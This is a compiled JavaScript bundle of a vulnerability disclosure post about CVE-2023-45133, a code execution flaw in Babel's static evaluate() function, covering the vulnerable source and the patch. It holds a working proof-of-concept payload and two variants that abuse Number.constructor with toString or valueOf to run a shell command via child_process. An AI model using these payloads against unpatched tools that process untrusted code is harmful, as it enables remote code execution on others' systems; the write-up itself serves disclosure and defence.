"use strict";(self.webpackChunk=self.webpackChunk||[]).push([["5651"],{33187:function(e,n,t){t.r(n),t.d(n,{assets:function(){return l},contentTitle:function(){return a},default:function(){return h},frontMatter:function(){return o},metadata:function(){return i},toc:function(){return c}});var i=t(85107),r=t(85893),s=t(50065);let o={layout:"post",title:"CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel",authors:"william_khem_marquez",date:new Date("2023-10-18T00:00:00.000Z"),share_text:"CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel"},a=void 0,l={authorsImageUrls:[void 0]},c=[{value:"The Exploit",id:"the-exploit",level:2},{value:"Proof of Concept",id:"proof-of-concept",level:3},{value:"Exploit Breakdown",id:"exploit-breakdown",level:3},{value:"Vulnerable Source Code",id:"vulnerable-source-code",level:4},{value:"Handling of Call Expressions",id:"handling-of-call-expressions",level:4},{value:"Handling of Object Expressions",id:"handling-of-object-expressions",level:4},{value:"The Patch",id:"the-patch",level:2},{value:"A side note on disclosure timing",id:"a-side-note-on-disclosure-timing",level:2},{value:"Conclusion",id:"conclusion",level:2},{value:"References",id:"references",level:2}];function d(e){let n={a:"a",admonition:"admonition",code:"code",em:"em",h2:"h2",h3:"h3",h4:"h4",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.a)(),...e.components},{Details:t,Head:i}=n;return t||u("Details",!0),i||u("Head",!0),(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(i,{children:(0,r.jsx)("link",{rel:"canonical",href:"https://steakenthusiast.github.io/2023/10/11/CVE-2023-45133-Finding-an-Arbitrary-Code-Execution-Vulnerability-In-Babel/"})}),"\n",(0,r.jsxs)(n.p,{children:["On October 10th, 2023, I stumbled upon an arbitrary code execution vulnerability in ",(0,r.jsx)(n.a,{href:"https://github.com/babel/babel/",children:"Babel"}),", which was subsequently assigned the identifier CVE-2023-45133. In this post, I\u2019ll walk you through the journey of discovering and exploiting this intriguing flaw."]}),"\n",(0,r.jsx)(n.admonition,{type:"tip",children:(0,r.jsxs)(n.p,{children:["This article was originally published on ",(0,r.jsx)(n.a,{href:"https://steakenthusiast.github.io/",children:"William Khem Marquez's blog"}),". He also published a series on using Babel to deobfuscate JavaScript code: check it out!"]})}),"\n",(0,r.jsxs)(n.p,{children:["Those who use Babel for reverse engineering/code deobfuscation love using Babel because of all of the built in functionality it provides. One of the most useful features is the ability to statically evaluate expressions using ",(0,r.jsx)(n.code,{children:"path.evaluate()"})," and ",(0,r.jsx)(n.code,{children:"path.evaluateTruthy()"}),". I have written about this in the previous articles:"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://steakenthusiast.github.io/2022/05/28/Deobfuscating-Javascript-via-AST-Manipulation-Constant-Folding/",children:"Constant Folding"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://steakenthusiast.github.io/2022/06/14/Deobfuscating-Javascript-via-AST-Deobfuscating-a-Peculiar-JSFuck-style-Case/",children:"A Peculiar JSFuck-style Case"})}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["Wait, did I say ",(0,r.jsx)(n.em,{children:"statically evaluate"}),"?"]}),"\n",(0,r.jsx)(n.h2,{id:"the-exploit",children:"The Exploit"}),"\n",(0,r.jsx)(n.p,{children:"Before delving into the details, let\u2019s take a look at the proof of concept I came up with:"}),"\n",(0,r.jsx)(n.h3,{id:"proof-of-concept",children:"Proof of Concept"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'const parser = require("@babel/parser");\nconst traverse = require("@babel/traverse").default;\n\nconst source = `String({  toString: Number.constructor("console.log(process.mainModule.require(\'child_process\').execSync(\'id\').toString())")});`;\n\nconst ast = parser.parse(source);\n\nconst evalVisitor = {\n  Expression(path) {\n    path.evaluate();\n  },\n};\n\ntraverse(ast, evalVisitor);\n'})}),"\n",(0,r.jsxs)(n.p,{children:["This simply outputs the result of the ",(0,r.jsx)(n.code,{children:"id"})," command to the terminal, as can be seen below."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"\u250C\u2500\u2500(kali\u327Fkali)-[~/Babel RCE]\n\u2514\u2500$ node exploit.js\nuid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),115(scanner),138(wireshark),141(kaboxer),142(vboxsf)\n"})}),"\n",(0,r.jsx)(n.p,{children:"Of course, the payload can be adapted to do anything, such as exfiltrate data or spawn a reverse shell."}),"\n",(0,r.jsx)("img",{alt:"\uD83D\uDE01",src:"/assets/2023-10-16-cve-2023-45133/success.jpg",style:{display:"block",marginLeft:"auto",marginRight:"auto",width:"50%"}}),"\n",(0,r.jsx)(n.h3,{id:"exploit-breakdown",children:"Exploit Breakdown"}),"\n",(0,r.jsxs)(n.p,{children:["To understand why this vulnerability works, we need to understand the source code of the culprit function, ",(0,r.jsx)(n.code,{children:"evaluate"}),". The source code of ",(0,r.jsx)(n.code,{children:"babel-traverse/src/path/evaluation.ts"})," prior to the fix is archived ",(0,r.jsx)(n.a,{href:"https://github.com/babel/babel/blob/7e198e5959b18373db3936fa3223c0811cebfac1/packages/babel-traverse/src/path/evaluation.ts",children:"here"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-typescript",children:'/**\n * Walk the input `node` and statically evaluate it.\n *\n * Returns an object in the form `{ confident, value, deopt }`. `confident`\n * indicates whether or not we had to drop out of evaluating the expression\n * because of hitting an unknown node that we couldn\'t confidently find the\n * value of, in which case `deopt` is the path of said node.\n *\n * Example:\n *\n *   t.evaluate(parse("5 + 5")) // { confident: true, value: 10 }\n *   t.evaluate(parse("!true")) // { confident: true, value: false }\n *   t.evaluate(parse("foo + foo")) // { confident: false, value: undefined, deopt: NodePath }\n *\n */\n\nexport function evaluate(this: NodePath): {\n  confident: boolean;\n  value: any;\n  deopt?: NodePath;\n} {\n  const state: State = {\n    confident: true,\n    deoptPath: null,\n    seen: new Map(),\n  };\n  let value = evaluateCached(this, state);\n  if (!state.confident) value = undefined;\n\n  return {\n    confident: state.confident,\n    deopt: state.deoptPath,\n    value: value,\n  };\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["When ",(0,r.jsx)(n.code,{children:"evaluate"})," is called on a NodePath, it goes through the ",(0,r.jsx)(n.code,{children:"evaluatedCached"})," wrapper, before reaching the ",(0,r.jsx)(n.code,{children:"_evaluate"})," function which does all the heavy lifting. The ",(0,r.jsx)(n.code,{children:"_evaluate"})," function is where the vulnerability lies."]}),"\n",(0,r.jsx)(n.p,{children:"This function is responsible for recursively breaking down AST nodes until it reaches an atomic operation that can be evaluated confidently. The majority of the base cases are evaluated for atomic operations only (such as for binary expressions between two literals). However, there are a few exceptions to this rule."}),"\n",(0,r.jsxs)(n.p,{children:["The two pieces of the source code we care about are the handling of ",(0,r.jsx)(n.strong,{children:"call expressions"})," and ",(0,r.jsx)(n.strong,{children:"object expressions"}),", as shown below:"]}),"\n",(0,r.jsx)(n.h4,{id:"vulnerable-source-code",children:"Vulnerable Source Code"}),"\n",(0,r.jsxs)(t,{children:[(0,r.jsxs)("summary",{children:["Relevant ",(0,r.jsx)("code",{children:"_evaluate"})," source code"]}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-typescript",children:'const VALID_OBJECT_CALLEES = ["Number", "String", "Math"] as const;\nconst VALID_IDENTIFIER_CALLEES = [\n  "isFinite",\n  "isNaN",\n  "parseFloat",\n  "parseInt",\n  "decodeURI",\n  "decodeURIComponent",\n  "encodeURI",\n  "encodeURIComponent",\n  process.env.BABEL_8_BREAKING ? "btoa" : null,\n  process.env.BABEL_8_BREAKING ? "atob" : null,\n] as const;\n\nconst INVALID_METHODS = ["random"] as const;\n\nfunction isValidObjectCallee(\n  val: string\n): val is (typeof VALID_OBJECT_CALLEES)[number] {\n  return VALID_OBJECT_CALLEES.includes(\n    // @ts-expect-error val is a string\n    val\n  );\n}\n\nfunction isValidIdentifierCallee(\n  val: string\n): val is (typeof VALID_IDENTIFIER_CALLEES)[number] {\n  return VALID_IDENTIFIER_CALLEES.includes(\n    // @ts-expect-error val is a string\n    val\n  );\n}\n\nfunction isInvalidMethod(val: string): val is (typeof INVALID_METHODS)[number] {\n  return INVALID_METHODS.includes(\n    // @ts-expect-error val is a string\n    val\n  );\n}\n\nfunction _evaluate(path: NodePath, state: State): any {\n  /** snip **/\n  if (path.isObjectExpression()) {\n    const obj = {};\n    const props = path.get("properties");\n    for (const prop of props) {\n      if (prop.isObjectMethod() || prop.isSpreadElement()) {\n        deopt(prop, state);\n        return;\n      }\n      const keyPath = (prop as NodePath<t.ObjectProperty>).get("key");\n      let key;\n      // @ts-expect-error todo(flow->ts): type refinement issues ObjectMethod and SpreadElement somehow not excluded\n      if (prop.node.computed) {\n        key = keyPath.evaluate();\n        if (!key.confident) {\n          deopt(key.deopt, state);\n          return;\n        }\n        key = key.value;\n      } else if (keyPath.isIdentifier()) {\n        key = keyPath.node.name;\n      } else {\n        key = (\n          keyPath.node as t.StringLiteral | t.NumericLiteral | t.BigIntLiteral\n        ).value;\n      }\n      const valuePath = (prop as NodePath<t.ObjectProperty>).get("value");\n      let value = valuePath.evaluate();\n      if (!value.confident) {\n        deopt(value.deopt, state);\n        return;\n      }\n      value = value.value;\n      // @ts-expect-error key is any type\n      obj[key] = value;\n    }\n    return obj;\n  }\n\n  /** snip **/\n  if (path.isCallExpression()) {\n    const callee = path.get("callee");\n    let context;\n    let func;\n\n    // Number(1);\n    if (\n      callee.isIdentifier() &&\n      !path.scope.getBinding(callee.node.name) &&\n      (isValidObjectCallee(callee.node.name) ||\n        isValidIdentifierCallee(callee.node.name))\n    ) {\n      func = global[callee.node.name];\n    }\n\n    if (callee.isMemberExpression()) {\n      const object = callee.get("object");\n      const property = callee.get("property");\n\n      // Math.min(1, 2)\n      if (\n        object.isIdentifier() &&\n        property.isIdentifier() &&\n        isValidObjectCallee(object.node.name) &&\n        !isInvalidMethod(property.node.name)\n      ) {\n        context = global[object.node.name];\n        // @ts-expect-error property may not exist in context object\n        func = context[property.node.name];\n      }\n\n      // "abc".charCodeAt(4)\n      if (object.isLiteral() && property.isIdentifier()) {\n        // @ts-expect-error todo(flow->ts): consider checking ast node type instead of value type (StringLiteral and NumberLiteral)\n        const type = typeof object.node.value;\n        if (type === "string" || type === "number") {\n          // @ts-expect-error todo(flow->ts): consider checking ast node type instead of value type\n          context = object.node.value;\n          func = context[property.node.name];\n        }\n      }\n    }\n\n    if (func) {\n      const args = path\n        .get("arguments")\n        .map((arg) => evaluateCached(arg, state));\n      if (!state.confident) return;\n\n      return func.apply(context, args);\n    }\n  }\n  /** snip **/\n}\n'})})]}),"\n",(0,r.jsx)(n.h4,{id:"handling-of-call-expressions",children:"Handling of Call Expressions"}),"\n",(0,r.jsxs)(n.p,{children:["The first thing to understand is that while call expressions can indeed be evaluated, they are subject to a whitelist check, relying on the ",(0,r.jsx)(n.code,{children:"VALID_OBJECT_CALLEES"})," or ",(0,r.jsx)(n.code,{children:"VALID_IDENTIFIER_CALLEES"})," arrays."]}),"\n",(0,r.jsx)(n.p,{children:"Additionally, there are three cases for handling call expressions:"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["When the callee is an identifier, and the identifier is whitelisted in ",(0,r.jsx)(n.code,{children:"VALID_OBJECT_CALLEES"})," or ",(0,r.jsx)(n.code,{children:"VALID_IDENTIFIER_CALLEES"}),"."]}),"\n",(0,r.jsxs)(n.li,{children:["When the callee is a member expression, the object is an identifier, the identifier is whitelisted in ",(0,r.jsx)(n.code,{children:"VALID_OBJECT_CALLEES"}),", and the property is not blacklisted in ",(0,r.jsx)(n.code,{children:"INVALID_METHODS"}),"."]}),"\n",(0,r.jsx)(n.li,{children:"When the callee is a member expression, the object is a literal, and the property is a string/numeric literal."}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"The most interesting one is the second case:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-typescript",children:'if (\n  object.isIdentifier() &&\n  property.isIdentifier() &&\n  isValidObjectCallee(object.node.name) &&\n  !isInvalidMethod(property.node.name)\n) {\n  context = global[object.node.name];\n  // @ts-expect-error property may not exist in context object\n  func = context[property.node.name];\n}\n\n/** snip **/\nif (func) {\n  const args = path.get("arguments").map((arg) => evaluateCached(arg, state));\n  if (!state.confident) return;\n\n  return func.apply(context, args);\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["The only blacklisted method is ",(0,r.jsx)(n.code,{children:"random"}),", which is a method of the ",(0,r.jsx)(n.code,{children:"Math"})," object. This means that any other method of either the whitelisted ",(0,r.jsx)(n.code,{children:"Number"}),", ",(0,r.jsx)(n.code,{children:"String"}),", or ",(0,r.jsx)(n.code,{children:"Math"})," objects can be directly referenced."]}),"\n",(0,r.jsxs)(n.p,{children:["In JavaScript, all classes are functions. Since ",(0,r.jsx)(n.code,{children:"Number"})," and ",(0,r.jsx)(n.code,{children:"String"})," are global JavaScript classes, their ",(0,r.jsx)(n.code,{children:"constructor"})," property points to the ",(0,r.jsx)(n.code,{children:"Function"})," constructor."]}),"\n",(0,r.jsx)(n.p,{children:"Therefore, the two expressions below are equivalent:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"Number.constructor('javascript_code_here;');\nFunction('javascript_code_here;');\n"})}),"\n",(0,r.jsxs)(n.p,{children:["Passing in an arbitrary string to the ",(0,r.jsx)(n.code,{children:"Function"})," constructor returns a function that will evaluate the provided string as JavaScript code when called."]}),"\n",(0,r.jsxs)(n.p,{children:["The AST node generated by ",(0,r.jsx)(n.code,{children:"Number.constructor('javascript_code_here;')"})," contains:"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["A call expression, where","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["The callee is a member expression, where","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["The object is an identifier, with name whitelisted by ",(0,r.jsx)(n.code,{children:"VALID_OBJECT_CALLEES"})]}),"\n",(0,r.jsxs)(n.li,{children:["The property is an identifier, not blacklisted by ",(0,r.jsx)(n.code,{children:"INVALID_METHODS"})]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.li,{children:"The arguments are a single string literal, containing the code to be executed."}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"Therefore, the code is considered safe to evaluate, and we have successfuly crafted a malicious function."}),"\n",(0,r.jsxs)(n.p,{children:["However, it is crucial to note that this ",(0,r.jsx)(n.em,{children:"cannot call the function on its own"}),". It only ",(0,r.jsx)(n.strong,{children:"creates an anonymous function"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["So, how exactly ",(0,r.jsx)(n.em,{children:"can"})," we call the function? This is where the second piece of the puzzle comes in: ",(0,r.jsx)(n.strong,{children:"object expressions"}),"."]}),"\n",(0,r.jsx)(n.h4,{id:"handling-of-object-expressions",children:"Handling of Object Expressions"}),"\n",(0,r.jsxs)(n.p,{children:["Within Babel\u2019s ",(0,r.jsx)(n.code,{children:"_evaluate"})," method, an ",(0,r.jsx)(n.code,{children:"ObjectExpression"})," node undergoes recursive evaluation, producing a true JavaScript object. There\u2019s no limitation on key names for ",(0,r.jsx)(n.code,{children:"ObjectProperty"}),". As long as every ",(0,r.jsx)(n.code,{children:"ObjectProperty"})," child in the ",(0,r.jsx)(n.code,{children:"ObjectExpression"})," yields ",(0,r.jsx)(n.code,{children:"confident: true"})," from ",(0,r.jsx)(n.code,{children:"_evaluate()"}),", we can obtain a JavaScript object with custom keys/values."]}),"\n",(0,r.jsxs)(n.p,{children:["A key property to leverage is ",(0,r.jsx)(n.code,{children:"toString"})," (",(0,r.jsx)(n.a,{href:"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString",children:"MDN Reference"}),"). Defining this property on an object to a function we control will allow us to execute arbitrary code when the object is converted to a string."]}),"\n",(0,r.jsx)(n.p,{children:"This is exactly what we do in the payload:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"String(({  toString: Number.constructor(\"console.log(process.mainModule.require('child_process').execSync('id').toString())\")}));\n"})}),"\n",(0,r.jsxs)(n.p,{children:["We\u2019ve assigned our malicious function, crafted via the ",(0,r.jsx)(n.code,{children:"Function"})," constructor, to the ",(0,r.jsx)(n.code,{children:"toString"})," property of the object. Thus, when this object undergoes a string conversion, it gets triggered and executed."]}),"\n",(0,r.jsxs)(n.p,{children:["In the provided example, we pass the object to the ",(0,r.jsx)(n.code,{children:"String"})," function, given its status as a whitelisted function (referenced in case 1). Still, the ",(0,r.jsx)(n.code,{children:"String"})," constructor isn\u2019t mandatory. Implicit type coercion in JavaScript can also trigger our malicious function, as demonstratedin these alternative payload formats:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"\"\"+(({  toString: Number.constructor(\"console.log(process.mainModule.require('child_process').execSync('id').toString())\")}));\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"1+(({  valueOf: Number.constructor(\"console.log(process.mainModule.require('child_process').execSync('id').toString())\")}));\n"})}),"\n",(0,r.jsxs)(n.p,{children:["The first example employs type-coercion to transform the object into a string. In contrast, the second example utilizes type-coercion to convert it into a number, as detailed in ",(0,r.jsx)(n.a,{href:"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf",children:"Object.prototype.valueOf()"}),". Both examples exploit the ",(0,r.jsx)(n.code,{children:"_evaluate()"})," method\u2019s approach to handling ",(0,r.jsx)(n.code,{children:"BinaryExpression"})," nodes, which directly performs the operation after recursively evaluating the left and right operands."]}),"\n",(0,r.jsx)(n.h2,{id:"the-patch",children:"The Patch"}),"\n",(0,r.jsx)(n.p,{children:"Upon disclosing this vulnerability, I was impressed by the swift response from the Babel team, who promptly rolled out a patch. This patch was released in two parts:"}),"\n",(0,r.jsxs)(n.p,{children:["The first of which was a workaround for all of the affected official Babel packages, by guarding the calls to ",(0,r.jsx)(n.code,{children:"evalute()"})," with an ",(0,r.jsx)(n.code,{children:"isPure()"})," check. ",(0,r.jsx)(n.a,{href:"https://github.com/babel/babel/blob/4c155667cf50291132089a4556cd3c6cc9d2e640/packages/babel-traverse/src/scope/index.ts#L871",children:"isPure"})," inherently prevents this bug, as it returns false for all ",(0,r.jsx)(n.code,{children:"MemberExpression"})," nodes. ",(0,r.jsx)(n.a,{href:"https://github.com/babel/babel/pull/16032",children:"PR #16032: Update babel-polyfills packages"})]}),"\n",(0,r.jsxs)(n.p,{children:["The subsequent step involved refining the ",(0,r.jsx)(n.code,{children:"evaluate()"})," function. This adjustment ensured that all inherited methods, not only ",(0,r.jsx)(n.code,{children:"constructor"}),", were prevented from being called. ",(0,r.jsx)(n.a,{href:"https://github.com/babel/babel/pull/16033",children:"PR #16033: Only evaluate own String/Number/Math methods"})]}),"\n",(0,r.jsxs)(n.p,{children:["After the fixes were implemented, GitHub staff issued ",(0,r.jsx)(n.a,{href:"https://github.com/advisories/GHSA-67hx-6x53-jw92",children:(0,r.jsx)(n.strong,{children:"CVE-2023-45133"})})," for the security advisory."]}),"\n",(0,r.jsx)(n.h2,{id:"a-side-note-on-disclosure-timing",children:"A side note on disclosure timing"}),"\n",(0,r.jsx)(n.p,{children:"You might have noticed that this blog post was released on the same day as the security advisory. Usually for critical vulnerabilities, it\u2019s customary to wait a while before disclosing a proof of concept. However, I believe this disclosure timing is justifiable for a few reasons:"}),"\n",(0,r.jsxs)(n.p,{children:["Predominantly, the vast majority of Babel users remain unaffected by this vulnerability. Babel is primarily utilized for refactoring and transpiling ",(0,r.jsx)(n.strong,{children:"one\u2019s own code"}),", which means the typical use case doesn\u2019t expose users to this risk. It\u2019s improbable that many have server-side implementations that accept and process arbitrary code from users through the compilation plugins or the invocation of ",(0,r.jsx)(n.code,{children:"path.evaluate"}),". Furthermore, there are really only a couple real use-cases for using Babel to analyze untrusted code on the server-side:"]}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Reverse engineering bot mitigation software, etc."}),"\n",(0,r.jsx)(n.li,{children:"Malware analysis"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"In the first case, I doubt any legitimate bot mitigation entity would try to attempt Remote Code Execution (RCE) due to the legal ramifications. Meanwhile, professionals using Babel for malware reversal possess the expertise to conduct their analyses within controlled, sandboxed environments. Thus, the risk to the community, in real-world scenarios, remains minimal."}),"\n",(0,r.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,r.jsx)(n.p,{children:"Discovering and delving into this vulnerability was a fun experience. I initially stumbled upon the vulnerability during a brainstorming session for a Babel-based challenge for UofTCTF\u2019s upcoming capture the flag competition, where I was focusing on an entirely different, non-security-related \u201Cbug\u201D."}),"\n",(0,r.jsx)(n.p,{children:"This vulnerability predominantly impacts those integrating untrusted code with Babel. Unfortunately, this places individuals leveraging Babel for \u201Cstatic deobfuscation\u201D directly in the crosshairs of this attack vector."}),"\n",(0,r.jsx)(n.p,{children:"There\u2019s a touch of irony in the fact that my first credited CVE emerged from reverse engineering Babel - the very tool I often employ for reverse engineering JavaScript, and the topic of all of my previous posts \uD83E\uDD23."}),"\n",(0,r.jsx)(n.p,{children:"This was a great learning experience, and hopefully this write-up was useful to you as well. Thanks for reading, and take care!"}),"\n",(0,r.jsx)(n.h2,{id:"references",children:"References"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cve.org/CVERecord?id=CVE-2023-45133",children:"CVE-2023-45133"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://github.com/advisories/GHSA-67hx-6x53-jw92",children:"GitHub Advisory Database: Arbitrary code execution when compiling specifically crafted malicious code"})}),"\n"]})]})}function h(e={}){let{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}function u(e,n){throw Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}},50065:function(e,n,t){t.d(n,{Z:function(){return a},a:function(){return o}});var i=t(67294);let r={},s=i.createContext(r);function o(e){let n=i.useContext(s);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),i.createElement(s.Provider,{value:n},e.children)}},85107:function(e){e.exports=JSON.parse('{"permalink":"/blog/2023/10/16/cve-2023-45133","source":"@site/blog/2023-10-16-cve-2023-45133.md","title":"CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel","description":"On October 10th, 2023, I stumbled upon an arbitrary code execution vulnerability in Babel, which was subsequently assigned the identifier CVE-2023-45133. In this post, I\u2019ll walk you through the journey of discovering and exploiting this intriguing flaw.","date":"2023-10-18T00:00:00.000Z","tags":[],"readingTime":9.965,"hasTruncateMarker":true,"authors":[{"name":"William Khem Marquez","url":"https://github.com/SteakEnthusiast/","key":"william_khem_marquez","page":null}],"frontMatter":{"layout":"post","title":"CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel","authors":"william_khem_marquez","date":"2023-10-18T00:00:00.000Z","share_text":"CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel"},"unlisted":false,"prevItem":{"title":"7.24.0 Released: Decorator updates and JSON modules imports","permalink":"/blog/2024/02/28/7.24.0"},"nextItem":{"title":"7.23.0 Released: Decorator Metadata and many new `import` features!","permalink":"/blog/2023/09/25/7.23.0"}}')}}]);